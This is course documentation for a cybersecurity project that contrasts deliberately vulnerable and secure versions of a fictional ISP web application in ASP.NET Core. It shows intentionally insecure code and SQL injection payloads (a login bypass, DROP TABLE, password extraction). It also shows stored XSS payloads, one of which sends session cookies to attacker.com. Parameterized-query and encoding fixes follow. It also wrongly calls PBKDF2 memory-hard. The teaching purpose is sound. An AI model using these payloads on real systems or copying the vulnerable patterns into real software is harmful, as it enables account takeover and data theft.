# LTD_Communication — Cyber Security Course Project
## Full Technical Documentation

**Course:** Cyber Security  
**Project:** Secure vs. Vulnerable Web Application  
**Company (Fictional):** LTD Communication — Internet Service Provider  
**Technology Stack:** ASP.NET Core 8 MVC, C#, SQL Server Express / LocalDB, Bootstrap 5  

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [System Architecture](#2-system-architecture)
3. [Database Schema](#3-database-schema)
4. [Vulnerable Implementation](#4-vulnerable-implementation)
5. [SQL Injection — Demonstration](#5-sql-injection--demonstration)
6. [Stored XSS — Demonstration](#6-stored-xss--demonstration)
7. [Secure Implementation](#7-secure-implementation)
8. [Password Hashing — PBKDF2](#8-password-hashing--pbkdf2)
9. [OWASP Secure Coding Practices Applied](#9-owasp-secure-coding-practices-applied)
10. [Screenshot Placeholders](#10-screenshot-placeholders)
11. [Conclusion](#11-conclusion)

---

## 1. Introduction

This project demonstrates the fundamental difference between **insecure** and **secure** web application development through a realistic ISP management system named **LTD Communication**.

The application is delivered in two complete, runnable versions:

| Version | Purpose |
|---|---|
| **VulnerableVersion** | Demonstrates SQL Injection and Stored XSS vulnerabilities in a realistic context |
| **SecureVersion** | Implements OWASP-recommended mitigations: parameterized queries, PBKDF2 password hashing, input validation, account lockout |

Both versions expose the same functional surface:

- User registration, login, and password management
- Customer management (add, list)
- Password reset via token

The contrast between the two versions makes each security concept concrete and testable.

---

## 2. System Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                       Web Browser                           │
│              (Bootstrap 5 + jQuery Validation)              │
└────────────────────────────┬────────────────────────────────┘
                             │ HTTP / HTTPS
┌────────────────────────────▼────────────────────────────────┐
│              ASP.NET Core 8 MVC Application                 │
│                                                             │
│  ┌──────────────────┐  ┌──────────────────────────────┐    │
│  │  AccountController│  │    CustomerController        │    │
│  │  - Register       │  │    - Add (POST)              │    │
│  │  - Login          │  │    - List (GET)              │    │
│  │  - ChangePassword │  └──────────────────────────────┘    │
│  │  - ForgotPassword │  ┌──────────────────────────────┐    │
│  │  - ResetPassword  │  │     HomeController           │    │
│  └──────────────────┘  │     - Index (dashboard)      │    │
│                         └──────────────────────────────┘    │
│  ┌──────────────────────────────────────────────────────┐   │
│  │              Helpers / Services                       │   │
│  │  DbHelper — SQL access (string concat OR parameterized│   │
│  │  PasswordHelper — plain-text OR PBKDF2               │   │
│  │  PasswordPolicyService — appsettings.json rules      │   │
│  │  TokenService — Guid + SHA-1 hashing                 │   │
│  └──────────────────────────────────────────────────────┘   │
│                                                             │
│  Session: ISession (cookie-based, server-side)              │
│  Auth:    SessionAuthorizeAttribute (custom filter)         │
└────────────────────────────┬────────────────────────────────┘
                             │ ADO.NET / Microsoft.Data.SqlClient
┌────────────────────────────▼────────────────────────────────┐
│              SQL Server Express / LocalDB                   │
│                                                             │
│   LTD_Communication_Vulnerable   LTD_Communication_Secure  │
│   (plain-text passwords)         (PBKDF2 hashed passwords)  │
└─────────────────────────────────────────────────────────────┘
```

### Key Architectural Decisions

- **No Entity Framework** — Raw ADO.NET via `Microsoft.Data.SqlClient` to make SQL construction visible and comparable between versions.
- **No ASP.NET Core Identity** — Custom password hashing makes the PBKDF2 implementation explicit.
- **No ORM magic** — Every SQL statement is written by hand, making vulnerabilities and fixes directly observable.

---

## 3. Database Schema

Both versions share the same schema. The `Salt` column is nullable to accommodate the VulnerableVersion (which does not use salts).

### Tables

#### `Users`
| Column | Type | Notes |
|---|---|---|
| Id | INT IDENTITY | Primary key |
| Username | NVARCHAR(100) | Unique |
| Email | NVARCHAR(200) | Unique |
| PasswordHash | NVARCHAR(500) | Plain text (Vulnerable) or PBKDF2 (Secure) |
| Salt | NVARCHAR(200) NULL | NULL in VulnerableVersion |
| FailedLoginAttempts | INT | Incremented on bad login (SecureVersion) |
| IsLocked | BIT | Set after MaxLoginAttempts failures |
| CreatedAt | DATETIME | Auto default |

#### `PasswordHistory`
| Column | Type | Notes |
|---|---|---|
| Id | INT IDENTITY | Primary key |
| UserId | INT | FK → Users |
| PasswordHash | NVARCHAR(500) | PBKDF2 hash |
| Salt | NVARCHAR(200) | Unique salt per entry |
| ChangedAt | DATETIME | Auto default |

Used by SecureVersion to enforce the "last 3 passwords" history policy.

#### `PasswordResetTokens`
| Column | Type | Notes |
|---|---|---|
| Id | INT IDENTITY | Primary key |
| UserId | INT | FK → Users |
| TokenHash | NVARCHAR(500) | Plain Guid (Vulnerable) or SHA-1 hash (Secure) |
| ExpiresAt | DATETIME | 1 hour from creation |
| IsUsed | BIT | Marked 1 after use |

#### `Sectors`
| Column | Type |
|---|---|
| Id | INT IDENTITY |
| Name | NVARCHAR(100) |
| Description | NVARCHAR(500) NULL |

Seed: Residential, Commercial, Industrial.

#### `InternetPackages`
| Column | Type |
|---|---|
| Id | INT IDENTITY |
| Name | NVARCHAR(100) |
| Speed | NVARCHAR(50) |
| Price | DECIMAL(10,2) |
| Description | NVARCHAR(500) NULL |

Seed: Basic (50 Mbps / $29.99), Standard (100 Mbps / $49.99), Premium (500 Mbps / $79.99), Ultra (1 Gbps / $119.99).

#### `Customers`
| Column | Type |
|---|---|
| Id | INT IDENTITY |
| FullName | NVARCHAR(200) |
| Email | NVARCHAR(200) |
| Phone | NVARCHAR(20) NULL |
| Address | NVARCHAR(500) NULL |
| SectorId | INT NULL → Sectors |
| PackageId | INT NULL → InternetPackages |
| CreatedBy | INT NULL → Users |
| CreatedAt | DATETIME |

---

## 4. Vulnerable Implementation

### 4.1 SQL Injection — Root Cause

The `DbHelper.cs` in the VulnerableVersion exposes methods that execute raw strings:

```csharp
// VulnerableVersion/Helpers/DbHelper.cs
public List<Dictionary<string, object?>> ExecuteQuery(string sql)
{
    using var conn = new SqlConnection(_connectionString);
    conn.Open();
    using var cmd = new SqlCommand(sql, conn);  // ← raw string, no parameters
    // ...
}
```

Callers build the SQL by string concatenation:

```csharp
// AccountController.cs — Login
string sql = "SELECT * FROM Users WHERE Username = '" + model.Username +
             "' AND PasswordHash = '" + model.Password + "'";
var rows = _db.ExecuteQuery(sql);
```

Any character in `model.Username` is inserted literally into the SQL string.

### 4.2 Stored XSS — Root Cause

The customer `FullName` is stored without sanitization and rendered with `@Html.Raw()`:

```csharp
// CustomerController.cs — Add
_db.ExecuteNonQuery(
    $"INSERT INTO Customers (FullName, ...) VALUES ('{model.FullName}', ...)");
```

```html
<!-- Customer/List.cshtml -->
<td>@Html.Raw(c.FullName)</td>  <!-- bypasses Razor's auto-encoding -->
```

### 4.3 Plain-Text Password Storage

```csharp
// PasswordHelper.cs (Vulnerable)
public static string HashPassword(string password) => password;  // no-op
```

A database dump immediately exposes all user passwords.

### 4.4 No Account Lockout

The Login action has no counter logic:

```csharp
// No FailedLoginAttempts tracking — unlimited brute-force allowed
if (rows.Count > 0) { /* login */ }
else { ModelState.AddModelError("", "Invalid credentials."); }
```

---

## 5. SQL Injection — Demonstration

### Attack 1: Login Bypass

**Target:** `POST /Account/Login`  
**Goal:** Authenticate as admin without knowing the password.

**Payload:**
```
Username: ' OR '1'='1' --
Password: anything
```

**Resulting SQL executed by the database:**
```sql
SELECT * FROM Users WHERE Username = '' OR '1'='1' --' AND PasswordHash = 'anything'
```

**Why it works:**
- `'1'='1'` is always TRUE → the WHERE clause returns all rows
- `--` comments out the rest of the query (including the password check)
- `rows.Count > 0` is true → attacker is logged in as the first user in the table (admin)

**Expected result:** Redirected to `/Home/Index` as user `admin`.

[Screenshot: Login page with SQL injection payload entered]  
[Screenshot: Dashboard showing successful login as admin]

---

### Attack 2: Register — Data Extraction / Second-Order Injection

**Target:** `POST /Account/Register`  
**Goal:** Register a username that breaks subsequent queries.

**Payload:**
```
Username: test'); DROP TABLE Users; --
Email:    test@test.com
Password: abc
```

**Resulting SQL:**
```sql
INSERT INTO Users (Username, Email, PasswordHash)
VALUES ('test'); DROP TABLE Users; --', 'test@test.com', 'abc')
```

> Note: SQL Server does not execute multiple statements by default via `SqlCommand`, but this shows why concatenation is dangerous — in other DB drivers or with `EXEC`, this would drop the table.

---

### Attack 3: Add Customer — Extracting Data

**Target:** `POST /Customer/Add`  
**Goal:** Use the FullName field to alter the INSERT and potentially read data.

**Payload in FullName:**
```
test', (SELECT TOP 1 PasswordHash FROM Users), NULL, NULL, NULL, NULL, 1); --
```

This closes the current VALUES tuple early and injects new data — a classic second-order injection technique.

---

## 6. Stored XSS — Demonstration

### Attack: Persistent Script Injection

**Target:** `POST /Customer/Add` → `GET /Customer/List`  
**Goal:** Store JavaScript that executes for every user who views the customer list.

**Payload (FullName field):**
```html
<script>alert('XSS by Attacker')</script>
```

**What happens:**
1. The `<script>` tag is saved as-is in the `Customers.FullName` column (no sanitization on insert).
2. When `/Customer/List` renders, `@Html.Raw(c.FullName)` outputs the tag verbatim into HTML.
3. The browser parses the `<script>` tag and executes `alert('XSS by Attacker')`.

**More dangerous payload (cookie theft):**
```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

This would silently exfiltrate the session cookie to an attacker's server.

[Screenshot: Add Customer form with XSS payload in Full Name field]  
[Screenshot: Customer List page showing the alert() popup]  
[Screenshot: Browser developer tools showing the raw script tag in the DOM]

---

## 7. Secure Implementation

### 7.1 SQL Injection Fix — Parameterized Queries

The `DbHelper.cs` in SecureVersion accepts `SqlParameter[]`:

```csharp
// SecureVersion/Helpers/DbHelper.cs
public List<Dictionary<string, object?>> ExecuteQuery(string sql, params SqlParameter[] parameters)
{
    using var conn = new SqlConnection(_connectionString);
    conn.Open();
    using var cmd = new SqlCommand(sql, conn);
    cmd.Parameters.AddRange(parameters);  // ← values bound separately from SQL structure
    // ...
}
```

**Login with parameterized query:**
```csharp
// Fetch user by username only — SQL structure is fixed at compile time
var rows = _db.ExecuteQuery(
    "SELECT * FROM Users WHERE Username = @Username",
    new SqlParameter("@Username", model.Username));
// Password verified via PBKDF2 — never in the SQL WHERE clause
```

**Why the injection fails:**
- The SQL structure `WHERE Username = @Username` is compiled first.
- The value `' OR '1'='1' --` is treated as a **literal string** to compare, not as SQL syntax.
- The database will search for a user whose username is literally `' OR '1'='1' --` — which does not exist.

### 7.2 XSS Fix — Razor Auto-Encoding

```html
<!-- SecureVersion/Views/Customer/List.cshtml -->
<td>@c.FullName</td>   <!-- Razor encodes < as &lt;, > as &gt;, " as &quot; etc. -->
```

If `FullName` contains `<script>alert('XSS')</script>`, Razor renders:
```html
<td>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</td>
```

The browser displays this as **text** — the script tag is never parsed or executed.

### 7.3 Account Lockout

```csharp
// AccountController.cs (Secure)
if (!PasswordHelper.VerifyPassword(model.Password, storedHash, salt))
{
    failedAttempts++;
    bool lockNow = failedAttempts >= maxAttempts;  // maxAttempts from appsettings.json

    _db.ExecuteNonQuery(
        "UPDATE Users SET FailedLoginAttempts = @Attempts, IsLocked = @Locked WHERE Id = @Id",
        new SqlParameter("@Attempts", failedAttempts),
        new SqlParameter("@Locked",   lockNow), ...);
}
```

After 3 consecutive failures, `IsLocked = 1` and all subsequent login attempts are rejected until an administrator manually resets the flag.

### 7.4 Password Policy (appsettings.json)

All rules are read from configuration — no hard-coded values:

```json
"PasswordPolicy": {
  "MinLength": 10,
  "RequireUppercase": true,
  "RequireLowercase": true,
  "RequireDigit": true,
  "RequireSpecialChar": true,
  "PasswordHistoryCount": 3,
  "MaxLoginAttempts": 3,
  "DictionaryPasswords": ["password", "123456", "password123", ...]
}
```

`PasswordPolicyService.ValidatePassword()` checks each rule and returns a list of failure messages. Passwords are only accepted when the list is empty.

### 7.5 Password History

On every successful password change, the new PBKDF2 hash is inserted into `PasswordHistory`. Before accepting a new password, the last `PasswordHistoryCount` hashes are retrieved and checked:

```csharp
foreach (var row in history)
{
    if (PasswordHelper.VerifyPassword(password, storedHash, salt))
    {
        errors.Add($"Password cannot match any of your last {historyCount} passwords.");
        break;
    }
}
```

### 7.6 Token Security (Forgot Password)

| | VulnerableVersion | SecureVersion |
|---|---|---|
| Token generated | `Guid.NewGuid().ToString("N")` | `Guid.NewGuid().ToString("N")` |
| Stored in DB | **Plain token** | **SHA-1 hash** of token |
| Verification | Direct string equality | Hash submitted token, compare hashes |
| DB breach impact | All tokens usable immediately | Hashes cannot be reversed to raw tokens |

```csharp
// SecureVersion — TokenService.cs
string rawToken  = TokenService.GenerateToken();     // sent in email URL
string tokenHash = TokenService.HashToken(rawToken); // SHA-1, stored in DB
```

---

## 8. Password Hashing — PBKDF2

### Why Not Plain Text?

If the database is breached, plain-text passwords expose every user account immediately, as well as any other services where users reuse passwords.

### Why Not MD5 / SHA-1 for Passwords?

MD5 and SHA-1 are fast hash functions — designed for speed, not security. An attacker with a GPU can compute **billions** of MD5 hashes per second, enabling brute-force and rainbow-table attacks.

### PBKDF2 — How It Works

**PBKDF2** (Password-Based Key Derivation Function 2) is specifically designed to be **slow** and **memory-hard**:

```
DerivedKey = PBKDF2(password, salt, iterations, keyLength, PRF)
```

Our implementation:

```csharp
private const int SaltSize  = 32;       // 256-bit random salt
private const int HashSize  = 32;       // 256-bit derived key
private const int Iterations = 100_000; // NIST SP 800-132 recommended minimum

public static (string hash, string salt) HashPassword(string password)
{
    byte[] saltBytes = RandomNumberGenerator.GetBytes(SaltSize);  // cryptographic RNG
    string salt = Convert.ToBase64String(saltBytes);

    using var pbkdf2 = new Rfc2898DeriveBytes(password, saltBytes, Iterations, HashAlgorithmName.SHA256);
    string hash = Convert.ToBase64String(pbkdf2.GetBytes(HashSize));

    return (hash, salt);
}
```

**Key properties:**

| Property | Value | Purpose |
|---|---|---|
| Algorithm | PBKDF2-SHA256 | HMAC-SHA256 as the pseudo-random function |
| Iterations | 100,000 | Makes each hash computation ~100,000× slower |
| Salt | 256-bit random per user | Every user has a unique hash → rainbow tables fail |
| Key length | 256 bits | 32 bytes output |

**Verification uses constant-time comparison:**

```csharp
return CryptographicOperations.FixedTimeEquals(computedBytes, storedBytes);
```

This prevents **timing oracle attacks** — the comparison always takes the same time regardless of where the strings differ.

### Storage Format

Both `PasswordHash` and `Salt` are stored as Base64 strings in NVARCHAR columns. Example:

```
Salt:         "a7F+3mKp...==" (Base64 of 32 random bytes)
PasswordHash: "QpX8rNs...==" (Base64 of PBKDF2-derived 32 bytes)
```

---

## 9. OWASP Secure Coding Practices Applied

This project applies principles from the **OWASP Secure Coding Practices Quick Reference Guide**:

### A01 — Broken Access Control
- Custom `[SessionAuthorize]` attribute blocks unauthenticated access to protected pages.
- Session IDs stored server-side — client only holds a cookie.

### A02 — Cryptographic Failures
- Passwords hashed with PBKDF2-SHA256 (100,000 iterations) + unique random salt.
- No sensitive data stored in plain text.
- Constant-time comparison prevents timing attacks.

### A03 — Injection (SQL)
- All database access uses `SqlParameter[]` — SQL structure and data are always separated.
- No string concatenation in SQL construction.

### A03 — Injection (XSS — Stored)
- Razor's default encoding (`@value`) converts `<`, `>`, `"`, `'`, `&` to HTML entities.
- `@Html.Raw()` is never used in the SecureVersion.

### A07 — Identification and Authentication Failures
- Account lockout after 3 failed attempts.
- Password policy enforced: length, complexity, dictionary, history.
- Token-based password reset with SHA-1 hashed tokens.
- Generic error messages on Login (no user enumeration).

### A08 — Software and Data Integrity Failures
- Password history prevents circular password reuse.
- Reset tokens invalidated after use (`IsUsed = 1`).
- Reset tokens expire after 1 hour.

### Input Validation
- `[Required]`, `[EmailAddress]`, `[StringLength]` data annotations on all ViewModels.
- Server-side `PasswordPolicyService` validates independently of client-side validation.

---

## 10. Screenshot Placeholders

The following screenshots should be captured during the demonstration and included in the submission:

### VulnerableVersion Screenshots

| # | Page | What to Capture |
|---|---|---|
| V-01 | Login | Empty form before attack |
| V-02 | Login | SQL injection payload `' OR '1'='1' --` entered in Username |
| V-03 | Dashboard | Successful bypass — logged in as admin |
| V-04 | Add Customer | XSS payload `<script>alert('XSS')</script>` entered in Full Name |
| V-05 | Customer List | Alert popup executing (Stored XSS) |
| V-06 | Customer List | Browser DevTools → Elements showing raw `<script>` tag in DOM |
| V-07 | Register | Submitting with weak password (e.g. "abc") — accepted |
| V-08 | Database | SQL Server Management Studio (SSMS) showing plain-text PasswordHash column |
| V-09 | Database | PasswordResetTokens table showing plain Guid token |

### SecureVersion Screenshots

| # | Page | What to Capture |
|---|---|---|
| S-01 | Login | SQL injection payload `' OR '1'='1' --` → login FAILS |
| S-02 | Login | 3rd failed attempt → account locked message |
| S-03 | Register | Weak password rejected — policy error messages |
| S-04 | Register | Strong password accepted |
| S-05 | Add Customer | `<script>alert('XSS')</script>` entered in Full Name |
| S-06 | Customer List | Script tag rendered as escaped text — no popup |
| S-07 | Change Password | Attempting to reuse old password — rejected |
| S-08 | Forgot Password | Simulated email link shown |
| S-09 | Database | SSMS showing PBKDF2 hash and salt in Users table |
| S-10 | Database | PasswordHistory table showing last 3 hashes |

---

## 11. Conclusion

This project demonstrates that many of the most critical web application vulnerabilities arise from simple, preventable coding choices:

| Vulnerability | Root Cause | Fix |
|---|---|---|
| SQL Injection | String concatenation in SQL | `SqlParameter` — bind values, not SQL |
| Stored XSS | Rendering user input without encoding | Razor auto-encoding (`@value`) |
| Credential Exposure | Plain-text password storage | PBKDF2 + random salt |
| Brute Force | No login attempt limits | Account lockout counter |
| Weak Passwords | No policy enforcement | Config-driven `PasswordPolicyService` |
| Token Exposure | Plain tokens in database | SHA-1 hash of reset token |

The OWASP Secure Coding Practices provide a clear, actionable checklist. Applying them consistently — as demonstrated in the SecureVersion of this project — addresses the majority of the OWASP Top 10 most critical web application risks.

Secure coding is not a one-time audit; it requires integrating these practices into every line of code that touches user input or data storage.

---

*LTD Communication — Cyber Security Course Project*  
*ASP.NET Core 8 MVC | C# | SQL Server Express | Bootstrap 5*
